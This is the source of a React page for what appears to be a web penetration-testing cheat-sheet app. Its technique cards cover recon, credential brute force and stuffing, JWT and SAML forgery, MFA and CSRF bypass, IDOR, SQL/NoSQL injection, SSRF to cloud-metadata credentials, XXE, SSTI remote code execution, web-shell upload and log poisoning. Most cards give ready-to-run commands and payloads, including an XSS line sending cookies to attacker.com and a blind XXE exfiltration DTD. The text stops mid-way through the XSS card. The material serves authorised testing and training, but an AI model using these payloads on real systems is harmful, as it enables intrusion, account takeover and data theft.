import React, { useState } from 'react';
import TechniqueCard from '../components/TechniqueCard';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'WEB RECONNAISSANCE',
    color: 'cyan',
    nodes: [
      { title: 'Passive Recon', subtitle: 'OSINT • Shodan • Google Dorks • cert.sh', id: 'passive-recon' },
      { title: 'Active Enumeration', subtitle: 'Dir/file brute-force • vhost • parameter fuzzing', id: 'active-enum' },
      { title: 'Tech Stack Fingerprint', subtitle: 'Headers • cookies • error pages • WAF detect', id: 'fingerprint' },
    ]
  },
  {
    header: 'AUTHENTICATION',
    color: 'blue',
    nodes: [
      { title: 'Brute Force & Spray', subtitle: 'Login brute • credential stuffing • default creds', id: 'auth-brute' },
      { title: 'JWT & Token Attacks', subtitle: 'Algorithm confusion • none alg • kid injection', id: 'jwt-attacks' },
      { title: 'OAuth & SSO Bypass', subtitle: 'OAuth flow abuse • SAML injection • OIDC tampering', id: 'oauth-sso' },
      { title: 'MFA Bypass', subtitle: 'Null code • response modify • backup code abuse', id: 'mfa-bypass' },
    ]
  },
  {
    header: 'SESSION MANAGEMENT',
    color: 'purple',
    nodes: [
      { title: 'Session Hijacking', subtitle: 'Cookie theft • fixation • predictable tokens', id: 'session-hijack' },
      { title: 'CSRF Attacks', subtitle: 'Token bypass • SameSite abuse • null token', id: 'csrf' },
    ]
  },
  {
    header: 'AUTHORIZATION',
    color: 'orange',
    nodes: [
      { title: 'IDOR / BOLA', subtitle: 'ID tampering • sequential IDs • encoded refs', id: 'idor-bola' },
      { title: 'Privilege Escalation', subtitle: 'Horizontal • vertical • role parameter abuse', id: 'privesc-web' },
      { title: 'Business Logic Flaws', subtitle: 'Race conditions • price manipulation • workflow', id: 'business-logic' },
    ]
  },
  {
    header: 'SERVER-SIDE ATTACKS',
    color: 'red',
    nodes: [
      { title: 'Injection — SQLi / NoSQL', subtitle: 'UNION • Blind • Time-based • MongoDB operators', id: 'sqli-nosql' },
      { title: 'SSRF', subtitle: 'Cloud metadata • internal ports • SSRF chaining', id: 'ssrf' },
      { title: 'XXE & SSTI', subtitle: 'XML entity injection • template engine RCE', id: 'xxe-ssti' },
      { title: 'File Upload & Path Traversal', subtitle: 'Bypass extension checks • web shell • LFI/RFI', id: 'file-upload' },
    ]
  },
  {
    header: 'CLIENT-SIDE ATTACKS',
    color: 'pink',
    nodes: [
      { title: 'XSS — Reflected & Stored', subtitle: 'Payload injection • HTML context • event handlers', id: 'xss' },
      { title: 'DOM XSS & CSP Bypass', subtitle: 'Sink analysis • unsafe-inline • JSONP bypass', id: 'dom-xss-csp' },
      { title: 'CORS Misconfiguration', subtitle: 'Wildcard origin • null origin • credential leakage', id: 'cors' },
      { title: 'Clickjacking', subtitle: 'iframe embedding • X-Frame-Options • UI redress', id: 'clickjacking' },
    ]
  },
  {
    header: 'API ATTACKS',
    color: 'green',
    nodes: [
      { title: 'API Enumeration', subtitle: 'Endpoint fuzzing • Swagger • GraphQL introspection', id: 'api-enum' },
      { title: 'Mass Assignment & BFLA', subtitle: 'Extra fields • role injection • function-level authz', id: 'mass-assignment' },
      { title: 'Rate Limit Bypass', subtitle: 'Header spoofing • IP rotation • account cycling', id: 'rate-limit' },
    ]
  },
  {
    header: 'PROTOCOL ATTACKS',
    color: 'yellow',
    nodes: [
      { title: 'HTTP Request Smuggling', subtitle: 'CL.TE • TE.CL • desync attacks • cache poison', id: 'smuggling' },
      { title: 'Cache Poisoning', subtitle: 'Host header • X-Forwarded-Host • vary bypass', id: 'cache-poison' },
      { title: 'Verb Tampering', subtitle: 'Method override • TRACE • OPTIONS abuse', id: 'verb-tampering' },
    ]
  },
  {
    header: 'SOURCE CODE ANALYSIS',
    color: 'cyan',
    nodes: [
      { title: 'Manual Code Review', subtitle: 'Route enum • taint tracing • dangerous functions', id: 'manual-review' },
      { title: 'SAST Tooling', subtitle: 'Semgrep • Bandit • gosec • CodeQL', id: 'sast' },
      { title: 'Framework-Specific Vulns', subtitle: 'Django • Rails • Spring • PHP • Express', id: 'framework-vulns' },
    ]
  },
];

const techniques = [
  // ─── WEB RECONNAISSANCE ───────────────────────────────────────────────────
  {
    id: 'passive-recon',
    title: 'Passive Web Reconnaissance',
    subtitle: 'Collect target intelligence without sending requests to the application',
    tags: ['OSINT', 'Shodan', 'Google Dorks', 'cert.sh', 'Wayback Machine', 'WHOIS'],
    accentColor: 'cyan',
    overview: 'Gather intelligence on the target without sending any requests to the application. Use public data sources to map the attack surface before any active testing begins.',
    steps: [
      'WHOIS / DNS: enumerate registrant, nameservers, subdomains via zone transfer or brute-force',
      'Certificate transparency (crt.sh): search for subdomains listed in TLS certificates',
      'Shodan / Censys: find exposed services, software versions, misconfigured hosts',
      'Google Dorks: site:, filetype:, inurl:, intitle: — discover admin panels, config files, exposed data',
      'Wayback Machine: discover old endpoints, parameters, and forgotten functionality',
      'GitHub / GitLab: search org repos for API keys, hardcoded secrets, internal URLs',
    ],
    commands: [
      {
        title: 'Passive recon commands',
        code: `# Certificate transparency — subdomain discovery
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Google Dorks
site:target.com filetype:env
site:target.com intitle:"Index of"
site:target.com inurl:admin
site:target.com filetype:sql OR filetype:bak OR filetype:conf

# Shodan
shodan search "hostname:target.com"
shodan host 93.184.216.34

# GitHub secrets recon
trufflehog github --org=TargetOrg --json

# Wayback Machine — all URLs
waybackurls target.com | sort -u > wayback_urls.txt
# Filter for interesting paths
cat wayback_urls.txt | grep -iE "api|admin|debug|test|backup|config"

# ASN / IP range enumeration
whois -h whois.radb.net -- '-i origin AS12345' | grep route`
      }
    ]
  },
  {
    id: 'active-enum',
    title: 'Active Web Enumeration',
    subtitle: 'Brute-force directories, files, virtual hosts, and parameters',
    tags: ['ffuf', 'gobuster', 'dirsearch', 'vhost', 'parameter fuzzing', 'wordlists'],
    accentColor: 'cyan',
    overview: 'Actively probe the target to discover hidden endpoints, virtual hosts, and parameters. This builds a complete map of the attack surface before vulnerability testing.',
    steps: [
      'Directory and file brute-force: discover hidden paths, admin panels, backup files',
      'Virtual host discovery: brute-force subdomains and vhosts on the same IP',
      'Parameter fuzzing: discover hidden GET/POST parameters that alter application behavior',
      'Backup file hunting: .bak, .old, ~, .swp, .zip archives of source code',
      'API endpoint discovery: fuzz /api/, /v1/, /v2/, /graphql, /rest',
    ],
    commands: [
      {
        title: 'Active enumeration with ffuf',
        code: `# Directory brute-force
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u https://target.com/FUZZ -mc 200,301,302,403

# File brute-force with extensions
ffuf -w wordlist.txt -u https://target.com/FUZZ \
  -e .php,.html,.js,.bak,.zip,.conf,.env -mc 200,301,403

# Virtual host discovery
ffuf -w subdomains.txt -H "Host: FUZZ.target.com" \
  -u https://target.com/ -fs 1234  # Filter by size

# Parameter fuzzing (GET)
ffuf -w params.txt -u "https://target.com/search?FUZZ=test" -fw 200

# Hidden parameter discovery (POST body)
ffuf -w params.txt -X POST -u https://target.com/api/action \
  -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded"

# Gobuster — fast directory scan
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50`
      }
    ]
  },
  {
    id: 'fingerprint',
    title: 'Technology Stack Fingerprinting',
    subtitle: 'Identify server technology, frameworks, WAFs, and versions for targeted attacks',
    tags: ['Wappalyzer', 'whatweb', 'WAF detection', 'version disclosure', 'headers'],
    accentColor: 'cyan',
    overview: 'Identify the server technology, frameworks, CMS, and WAF in use. Knowing the stack lets you target version-specific CVEs and framework-specific attack paths.',
    steps: [
      'HTTP response headers: Server, X-Powered-By, X-Generator reveal technology stack',
      'Cookie names: PHPSESSID (PHP), JSESSIONID (Java), ASP.NET_SessionId (.NET)',
      'Error pages: framework-specific error formats reveal version and framework',
      'WAF detection: send known payloads and observe response differences',
      'JavaScript files: framework fingerprints, version comments, API endpoints',
    ],
    commands: [
      {
        title: 'Stack fingerprinting',
        code: `# whatweb — technology fingerprinting
whatweb https://target.com -v

# HTTP headers inspection
curl -I https://target.com

# WAF detection
wafw00f https://target.com

# Check security headers
curl -I https://target.com | grep -iE "x-frame|x-xss|strict-transport|content-security|x-content-type"

# Nikto — basic web server scan
nikto -h https://target.com -ssl

# Detect CMS (WordPress, Joomla, Drupal)
wpscan --url https://target.com --enumerate ap,at,u`
      }
    ]
  },

  // ─── AUTHENTICATION ───────────────────────────────────────────────────────
  {
    id: 'auth-brute',
    title: 'Login Brute Force & Credential Stuffing',
    subtitle: 'Enumerate valid accounts and test passwords at scale',
    tags: ['hydra', 'brute force', 'credential stuffing', 'default creds', 'username enum'],
    accentColor: 'blue',
    overview: 'Identify valid accounts and test weak or default credentials before moving to full brute force. Always assess rate limiting and lockout policies first to avoid account lockouts.',
    steps: [
      'Enumerate valid usernames by comparing error messages, response times, and status codes',
      'Test default credentials before brute-forcing: admin/admin, admin/password, root/root',
      'Assess rate limiting and lockout policy — confirm thresholds before spraying',
      'Run targeted dictionary attack against confirmed usernames',
      'Perform credential stuffing using breach datasets against the login endpoint',

    ],
    commands: [
      {
        title: 'Login brute force',
        code: `# Hydra HTTP POST brute force
hydra -L users.txt -P passwords.txt target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Credential stuffing with ffuf
ffuf -w creds.txt -X POST -u https://target.com/login \
  -d "username=FUZZ1&password=FUZZ2" -w creds.txt:FUZZ \
  -mc 302 -t 10

# Username enumeration via timing
for user in admin root test user; do
  time curl -s -X POST https://target.com/login \
    -d "username=$user&password=wrongpassword" -o /dev/null
done

# Default credentials
hydra -l admin -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  target.com http-post-form "/login:u=^USER^&p=^PASS^:F=failed"`
      }
    ]
  },
  {
    id: 'jwt-attacks',
    title: 'JWT & Token Attacks',
    subtitle: 'Exploit JWT algorithm confusion, none algorithm, and kid header injection',
    tags: ['JWT', 'algorithm confusion', 'none alg', 'RS256 to HS256', 'kid injection'],
    accentColor: 'blue',
    overview: 'JWTs are used for stateless authentication. Weak signing, algorithm confusion, and insecure kid handling allow forging tokens to authenticate as any user including administrators.',
    steps: [
      'Decode the JWT and inspect the header (alg) and payload (role, exp, sub)',
      'Test none algorithm: change alg to "none" and strip the signature',
      'Test RS256→HS256 confusion: if the public key is known, re-sign as HS256 using it',
      'Test kid header injection: inject path traversal (../../dev/null) or SQL into the kid field',
      'Crack HS256 tokens offline with hashcat if the secret appears weak',
      'Manipulate exp or iat claims to extend token validity or replay expired tokens',

    ],
    commands: [
      {
        title: 'JWT exploitation',
        code: `# Crack HS256 JWT secret
hashcat -a 0 -m 16500 "eyJhbG...token" rockyou.txt

# jwt_tool — comprehensive JWT testing
pip install jwt_tool
python3 jwt_tool.py "eyJhbG...token" -T  # Tamper mode

# Algorithm confusion (RS256 → HS256 with public key)
python3 jwt_tool.py "eyJhbG...token" -X k \
  -pk public.pem  # Sign HS256 using RSA public key

# None algorithm bypass
python3 jwt_tool.py "eyJhbG...token" -X a  # alg=none

# Kid header injection (SQL)
# kid: "' UNION SELECT 'attacker_key' -- "
# Sign with "attacker_key"

# Kid header injection (path traversal)
# kid: "../../dev/null"
# Sign with empty string`
      }
    ]
  },
  {
    id: 'oauth-sso',
    title: 'OAuth 2.0, SAML & SSO Attacks',
    subtitle: 'Exploit authorization code interception, SAML assertion forgery, and OIDC flaws',
    tags: ['OAuth', 'SAML', 'OIDC', 'token interception', 'state bypass', 'open redirect'],
    accentColor: 'blue',
    overview: 'OAuth, SAML, and OIDC are complex protocols with many implementation flaws. Misconfigurations allow attackers to hijack authorization codes, forge assertions, and bypass SSO entirely.',
    steps: [
      'Test OAuth redirect_uri validation: try path appending, subdomain variations, and open redirects',
      'Intercept the authorization code via referrer leakage or missing state parameter (CSRF)',
      'Attempt SAML signature stripping: remove the <Signature> element and modify role/username attributes',
      'Test XML signature wrapping: wrap a valid signature around a malicious payload',
      'Test OIDC nonce bypass, id_token claim tampering, and missing state validation',

    ],
    commands: [
      {
        title: 'OAuth and SAML exploitation',
        code: `# OAuth redirect_uri bypass
# Test: append extra paths
https://target.com/callback/../admin
# Test: subdomain
https://attacker.target.com/callback
# Test: open redirect in allowed domain
https://allowed.com/redirect?url=https://attacker.com

# SAML signature stripping (Burp Suite or manual)
# 1. Capture SAML response (Base64 encoded)
echo "BASE64_SAML" | base64 -d > saml.xml
# 2. Remove <Signature> element
xmlstarlet ed -d "//ds:Signature" saml.xml > modified.xml
# 3. Change username/role attribute
xmlstarlet ed -u "//saml:Attribute[@Name='uid']/saml:AttributeValue" \
  -v "admin" modified.xml > forged.xml
# 4. Re-encode and submit
base64 -w0 forged.xml

# SAML comment injection
# Username: admin<!--
# Full NameID: admin<!--user@domain.com-->
# Parser sees: admin (if comment injection succeeds)

# OIDC state parameter removal
# Try auth request without &state= parameter
# If accepted: CSRF possible during OAuth flow`
      }
    ]
  },
  {
    id: 'mfa-bypass',
    title: 'MFA Bypass Techniques',
    subtitle: 'Bypass multi-factor authentication via logic flaws, API gaps, and code reuse',
    tags: ['MFA bypass', 'OTP reuse', 'null code', 'response manipulation', 'API bypass'],
    accentColor: 'blue',
    overview: 'MFA is often a thin layer applied on top of an existing auth flow. Logic flaws allow bypassing it entirely without needing the OTP code.',
    steps: [
      'Send null, empty string, or omit the OTP parameter entirely — some servers skip validation',
      'Intercept the MFA verification response and flip "success":false to true in Burp Suite',
      'Test the API login endpoint directly — it may not enforce the MFA step',
      'Check if the same OTP code can be reused across multiple requests',
      'Skip the MFA step by jumping directly from step 1 (login) to the post-auth page',
      'Brute-force numeric backup codes — 8-digit codes have only 10^8 combinations',

    ],
    commands: [
      {
        title: 'MFA bypass testing',
        code: `# Null/empty OTP
curl -X POST https://target.com/api/mfa/verify \
  -d '{"otp":""}' -H "Cookie: session=..."

curl -X POST https://target.com/api/mfa/verify \
  -d '{"otp":null}' -H "Cookie: session=..."

# Direct API access bypassing MFA check
curl -X POST https://target.com/api/login \
  -d '{"username":"admin","password":"pass"}' \
  -H "Content-Type: application/json"
# Does it return a valid session without MFA?

# Response manipulation in Burp Suite
# Step 1: Enter correct username/password
# Step 2: Intercept MFA page response
# Change: {"mfa_required":true} → {"mfa_required":false}

# Backup code brute force (8-digit numeric)
for code in {00000000..00001000}; do
  curl -s -X POST https://target.com/mfa/backup \
    -d "code=$code" | grep -v "Invalid"
done`
      }
    ]
  },

  // ─── SESSION MANAGEMENT ───────────────────────────────────────────────────
  {
    id: 'session-hijack',
    title: 'Session Hijacking & Fixation',
    subtitle: 'Steal, predict, or fix session tokens to impersonate users',
    tags: ['session fixation', 'cookie theft', 'token prediction', 'Secure flag', 'HttpOnly'],
    accentColor: 'purple',
    overview: 'Weak session token generation, missing cookie flags, and session fixation allow an attacker to take over authenticated user sessions without knowing their credentials.',
    steps: [
      'Check Set-Cookie headers for missing Secure, HttpOnly, and SameSite flags',
      'Test session fixation: set a session ID before login, verify it changes after authentication',
      'Collect 50+ session tokens and analyze for low entropy or predictable patterns',
      'If HttpOnly is missing, steal document.cookie via XSS payload',
      'Capture session tokens on plain HTTP connections via network sniffing',

    ],
    commands: [
      {
        title: 'Session security testing',
        code: `# Check cookie flags
curl -I https://target.com | grep -i "Set-Cookie"
# Look for: Secure; HttpOnly; SameSite=Strict

# Session fixation test
# 1. Get session before login
SESSION=$(curl -s -c - https://target.com/login | grep -i session | awk '{print $NF}')
# 2. Login with that session
curl -X POST https://target.com/login -b "session=$SESSION" -d "user=admin&pass=pass"
# 3. Check if session ID changed after login (should change)

# Token entropy analysis
python3 -c "
import requests
sessions = []
for i in range(50):
    r = requests.get('https://target.com', allow_redirects=False)
    sid = r.cookies.get('session') or r.cookies.get('PHPSESSID')
    sessions.append(sid)
    print(sid)
"
# Analyze for patterns / low entropy

# XSS session theft payload
# <script>fetch('https://attacker.com/?c='+document.cookie)</script>`
      }
    ]
  },
  {
    id: 'csrf',
    title: 'CSRF — Cross-Site Request Forgery',
    subtitle: 'Forge state-changing requests from victim browser using missing or bypassable CSRF tokens',
    tags: ['CSRF', 'SameSite', 'token bypass', 'referer bypass', 'CORS CSRF'],
    accentColor: 'purple',
    overview: 'CSRF forces an authenticated victim to unknowingly submit a forged request. Target state-changing actions like password change, email update, and fund transfer.',
    steps: [
      'Identify state-changing requests (POST, PUT, DELETE) and note any CSRF token fields',
      'Remove the CSRF token parameter entirely and resend — many servers skip server-side validation',
      'Send a null or empty CSRF token to check if the application validates non-empty values only',
      'Swap your CSRF token into another user\'s session — if not user-bound, it will work cross-account',
      'Test SameSite bypass via top-level navigation (GET-based state changes)',
      'Craft JSON CSRF via text/plain form encoding if the endpoint accepts non-JSON content types',

    ],
    commands: [
      {
        title: 'CSRF testing and exploitation',
        code: `<!-- CSRF PoC — change email -->
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://target.com/account/change-email">
    <input name="email" value="attacker@evil.com">
    <!-- No CSRF token included — test if request accepted -->
  </form>
</body>
</html>

# Test CSRF token validation
# 1. Remove token parameter
curl -X POST https://target.com/account/change-email \
  -d "email=attacker@evil.com" -H "Cookie: session=..."

# 2. Send empty token
curl -X POST https://target.com/account/change-email \
  -d "email=attacker@evil.com&csrf_token=" -H "Cookie: session=..."

# 3. Swap token with another user's valid token
# JSON CSRF (text/plain content type)
# <form enctype="text/plain" method="POST" ...>
#   <input name='{"email":"attacker@evil.com","x":"' value='test"}'>
# </form>`
      }
    ]
  },

  // ─── AUTHORIZATION ────────────────────────────────────────────────────────
  {
    id: 'idor-bola',
    title: 'IDOR & BOLA — Broken Object-Level Authorization',
    subtitle: 'Access other users\' data by manipulating object identifiers',
    tags: ['IDOR', 'BOLA', 'ID tampering', 'horizontal escalation', 'encoded IDs'],
    accentColor: 'orange',
    overview: 'IDOR occurs when user-supplied identifiers directly reference server-side objects without authorization checks. Systematically replace all IDs with values belonging to other users.',
    steps: [
      'Map all endpoints that accept user-controlled IDs (URL params, body fields, headers)',
      'Replace your own ID with sequential integers to enumerate other users\' resources',
      'Decode base64 or hashed IDs, modify the underlying value, re-encode and resubmit',
      'Test horizontal escalation: access another user\'s resource at the same privilege level',
      'Test indirect references: swap username, email, or reference code to access other accounts',
      'Automate enumeration with Burp Intruder or ffuf across ID ranges',

    ],
    commands: [
      {
        title: 'IDOR enumeration',
        code: `# Sequential ID enumeration
for i in {1000..2000}; do
  result=$(curl -s "https://target.com/api/user/$i" \
    -H "Cookie: session=YOUR_SESSION")
  if echo "$result" | grep -v "not found" > /dev/null; then
    echo "Found: $i — $result"
  fi
done

# UUID IDOR enumeration (if predictable)
# Log multiple UUIDs and look for patterns
curl -s "https://target.com/api/invoice/550e8400-e29b-41d4-a716-446655440000"

# Horizontal escalation
curl "https://target.com/api/profile?userId=VICTIM_ID" \
  -H "Authorization: Bearer YOUR_TOKEN"

# Encoded ID test
python3 -c "
import base64
for i in range(1, 200):
    enc = base64.b64encode(str(i).encode()).decode()
    print(f'{i}: {enc}')
"
# Try each encoded value`
      }
    ]
  },
  {
    id: 'privesc-web',
    title: 'Web Privilege Escalation',
    subtitle: 'Escalate from regular user to admin via parameter manipulation and role abuse',
    tags: ['vertical escalation', 'admin bypass', 'role parameter', 'function-level authz'],
    accentColor: 'orange',
    overview: 'Web privilege escalation exploits missing authorization checks on sensitive functions. Test every privileged endpoint with a regular user token — authorization is often only enforced in the UI.',
    steps: [
      'Directly request admin endpoints (/admin, /api/admin/*) using a regular user session',
      'Inject role or privilege parameters into request bodies: role=admin, isAdmin=true',
      'Test mass assignment on registration and profile update endpoints with admin flag fields',
      'Use X-HTTP-Method-Override to bypass method-based access control checks',
      'Attempt path traversal to reach admin handlers: /user/../../admin/panel',

    ],
    commands: [
      {
        title: 'Privilege escalation testing',
        code: `# Test admin endpoints directly
curl https://target.com/admin -H "Cookie: session=regular_user_session"
curl https://target.com/api/admin/users -H "Authorization: Bearer user_token"

# Role parameter injection
curl -X PUT https://target.com/api/profile \
  -H "Authorization: Bearer user_token" \
  -d '{"name":"user","role":"admin","is_staff":true}'

# Mass assignment — add admin flag
curl -X POST https://target.com/api/register \
  -d '{"username":"test","password":"test","admin":true,"role":"superuser"}'

# X-HTTP-Method-Override bypass
curl -X POST https://target.com/api/admin/delete \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: session=regular_user_session"

# Path traversal to admin
curl "https://target.com/user/profile/../../../admin/panel"`
      }
    ]
  },
  {
    id: 'business-logic',
    title: 'Business Logic Flaws',
    subtitle: 'Race conditions, price manipulation, workflow bypass, and financial abuse',
    tags: ['race condition', 'TOCTOU', 'price manipulation', 'workflow bypass', 'coupon abuse'],
    accentColor: 'orange',
    overview: 'Business logic flaws exploit the application\'s intended workflow rather than technical vulnerabilities. Target financial operations, single-use actions, and multi-step processes.',
    steps: [
      'Send concurrent requests for balance checks, transfers, or single-use codes to trigger race conditions',
      'Modify price, quantity, or discount values directly in the request body before submission',
      'Skip required workflow steps by posting directly to a later stage (e.g., skip payment, go to confirmation)',
      'Apply coupon codes concurrently in parallel requests to reuse single-use discounts',
      'Submit negative quantities or prices to generate unexpected credits or refunds',

    ],
    commands: [
      {
        title: 'Business logic exploitation',
        code: `# Race condition — concurrent transfer requests
curl -X POST https://target.com/api/transfer -d '{"amount":1000}' &
curl -X POST https://target.com/api/transfer -d '{"amount":1000}' &
wait
# Both may succeed if no atomic check

# Price manipulation
curl -X POST https://target.com/api/order \
  -d '{"item":"laptop","quantity":1,"price":0.01}'

# Negative quantity (get refund / credit)
curl -X POST https://target.com/api/order \
  -d '{"item":"widget","quantity":-5}'

# Workflow bypass — skip step 2 (payment), go to step 3 (confirmation)
curl -X POST https://target.com/checkout/confirm \
  -H "Cookie: session=..." \
  -d '{"cart_id":"123"}'
# Without completing payment step

# Coupon reuse
curl -X POST https://target.com/api/apply-coupon -d '{"code":"SAVE50"}' &
curl -X POST https://target.com/api/apply-coupon -d '{"code":"SAVE50"}' &
wait`
      }
    ]
  },

  // ─── SERVER-SIDE ATTACKS ──────────────────────────────────────────────────
  {
    id: 'sqli-nosql',
    title: 'SQL Injection & NoSQL Injection',
    subtitle: 'Inject into database queries for data extraction, authentication bypass, and RCE',
    tags: ['SQLi', 'NoSQL', 'UNION', 'blind SQLi', 'MongoDB operators', 'sqlmap'],
    accentColor: 'red',
    overview: 'SQL and NoSQL injection occurs when user input is unsafely incorporated into database queries. Successful exploitation can lead to authentication bypass, full data extraction, and in some cases RCE.',
    steps: [
      'Identify injectable parameters: test single quote (\') for SQL errors or behavior change',
      'Confirm injection type: boolean-based (response differs), time-based (SLEEP), or error-based',
      'Use UNION SELECT to extract column count, then dump database names and tables',
      'Test NoSQL: inject MongoDB operators ($ne, $gt, $regex) in JSON login bodies',
      'Automate with sqlmap for complex or blind injection scenarios',
      'Test out-of-band exfiltration via DNS using xp_dirtree or UTL_HTTP on MSSQL/Oracle',

    ],
    commands: [
      {
        title: 'SQL and NoSQL injection',
        code: `# SQLmap — automated SQLi
sqlmap -u "https://target.com/item?id=1" --dbs --risk 3 --level 5
sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump

# Manual SQL injection payloads
' OR '1'='1
' OR 1=1 --
admin' --
1' UNION SELECT NULL,NULL,table_name FROM information_schema.tables --
1; WAITFOR DELAY '0:0:5' --   # MSSQL time-based

# Authentication bypass
username=admin'--&password=anything
username=' OR '1'='1' --&password=x

# NoSQL (MongoDB) injection
# Normal: {"username":"admin","password":"pass"}
# Inject: {"username":{"$ne":""},"password":{"$ne":""}}
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# NoSQL regex bypass
# username[$regex]=^admin&password[$regex]=.*`
      }
    ]
  },
  {
    id: 'ssrf',
    title: 'SSRF — Server-Side Request Forgery',
    subtitle: 'Make the server perform requests to internal services, cloud metadata, and restricted endpoints',
    tags: ['SSRF', 'cloud metadata', '169.254.169.254', 'internal ports', 'SSRF chaining', 'gopher://'],
    accentColor: 'red',
    overview: 'SSRF tricks the server into making HTTP requests on your behalf, exposing internal services and cloud metadata endpoints. Chain with other vulnerabilities for maximum impact.',
    steps: [
      'Find URL-accepting parameters (fetch, webhook, import, redirect) and inject internal addresses',
      'Target localhost and 127.0.0.1 to reach services not exposed externally',
      'Fetch cloud metadata: AWS 169.254.169.254, GCP metadata.google.internal for IAM credentials',
      'Scan internal ports by iterating common services (Redis 6379, Elasticsearch 9200, MySQL 3306)',
      'Use DNS rebinding or open redirect chains to bypass IP allowlists',
      'Escalate with gopher:// to send raw TCP commands to internal Redis, SMTP, or Memcached',

    ],
    commands: [
      {
        title: 'SSRF exploitation',
        code: `# Basic SSRF
curl "https://target.com/api/fetch?url=http://localhost/admin"
curl "https://target.com/api/fetch?url=http://127.0.0.1:8080"

# AWS metadata credential theft
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP metadata
curl "https://target.com/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Internal port scan via SSRF
for port in 80 443 8080 8443 9200 6379 27017 3306 5432; do
  echo -n "Port $port: "
  curl -s "https://target.com/api/fetch?url=http://127.0.0.1:$port" | head -c 50
done

# SSRF via file upload (SVG SSRF)
echo '<svg><image href="http://internal-service:8080/admin"/></svg>' > ssrf.svg
# Upload SVG and observe server behavior

# Gopher protocol (Redis command injection via SSRF)
# gopher://127.0.0.1:6379/_%2A1%0D%0A%24...`
      }
    ]
  },
  {
    id: 'xxe-ssti',
    title: 'XXE & SSTI Injection',
    subtitle: 'XML External Entity injection and Server-Side Template Injection for file read and RCE',
    tags: ['XXE', 'SSTI', 'Jinja2', 'file read', 'RCE', 'DTD', 'template engine'],
    accentColor: 'red',
    overview: 'XXE exploits XML parsers that evaluate external entities to read local files or perform SSRF. SSTI exploits template engines to execute arbitrary code when user input reaches the render function.',
    steps: [
      'Detect XXE: submit XML input with a DOCTYPE and external entity pointing to file:///etc/passwd',
      'Use blind XXE for out-of-band exfiltration via DNS/HTTP when direct output is not reflected',
      'Detect SSTI by injecting {{7*7}}, ${7*7}, <%= 7*7 %> — a result of 49 confirms injection',
      'Identify the template engine from the successful syntax and select the appropriate RCE payload',
      'Exploit Jinja2 RCE via Python class hierarchy to call os.popen()',
      'Exploit FreeMarker, Twig, or OGNL using framework-specific expression syntax for RCE',

    ],
    commands: [
      {
        title: 'XXE and SSTI exploitation',
        code: `# XXE — file read
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>

# XXE — SSRF
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service:8080/admin">]>

# Blind XXE — OOB exfiltration
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
# evil.dtd: <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>"> %all;

# SSTI detection (try each, note which produces 49)
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Jinja2 RCE (restricted)
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# FreeMarker RCE
\${"freemarker.template.utility.Execute"?new()("id")}

# Twig RCE
{{['id']|filter('system')}}`
      }
    ]
  },
  {
    id: 'file-upload',
    title: 'File Upload Attacks & Path Traversal',
    subtitle: 'Upload web shells and read arbitrary files via insecure file handling',
    tags: ['file upload', 'web shell', 'LFI', 'path traversal', 'extension bypass', 'MIME bypass'],
    accentColor: 'red',
    overview: 'Unrestricted file upload leads to web shell execution. Path traversal allows reading arbitrary files. Both can escalate to full RCE via log poisoning or PHP session file inclusion.',
    steps: [
      'Attempt direct PHP shell upload — if blocked, try double extension (shell.php.jpg)',
      'Change the Content-Type header to image/jpeg while keeping the PHP payload inside',
      'Embed PHP in image metadata using exiftool to create a polyglot file',
      'Test path traversal in download/include parameters: ../../etc/passwd with URL encoding variations',
      'Achieve LFI→RCE via log poisoning: inject PHP into User-Agent, then include the log file',
      'Try null byte injection (shell.php%00.jpg) on older PHP applications',

    ],
    commands: [
      {
        title: 'File upload and path traversal',
        code: `# Web shell upload bypass techniques
# Double extension
shell.php.jpg  → server renames but may execute as PHP

# Null byte (older PHP)
shell.php%00.jpg

# Change Content-Type
curl -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg"

# Polyglot PHP/JPEG (embeds PHP in valid image)
# Use exiftool: exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg -o shell.php.jpg

# Path traversal
curl "https://target.com/download?file=../../etc/passwd"
curl "https://target.com/download?file=..%2F..%2Fetc%2Fpasswd"
curl "https://target.com/download?file=....//....//etc/passwd"  # Filter bypass

# LFI — read sensitive files
https://target.com/page?include=../../../etc/passwd
https://target.com/page?include=../../../proc/self/environ

# LFI log poisoning (Apache)
# 1. Poison log: curl -A "<?php system('id'); ?>" https://target.com/
# 2. Include log: https://target.com/page?include=/var/log/apache2/access.log`
      }
    ]
  },

  // ─── CLIENT-SIDE ATTACKS ──────────────────────────────────────────────────
  {
    id: 'xss',
    title: 'XSS — Reflected & Stored',
    subtitle: 'Inject scripts into responses to steal sessions, perform actions, or redirect users',
    tags: ['XSS', 'reflected XSS', 'stored XSS', 'payload', 'context analysis', 'filter bypass'],
    accentColor: 'pink',
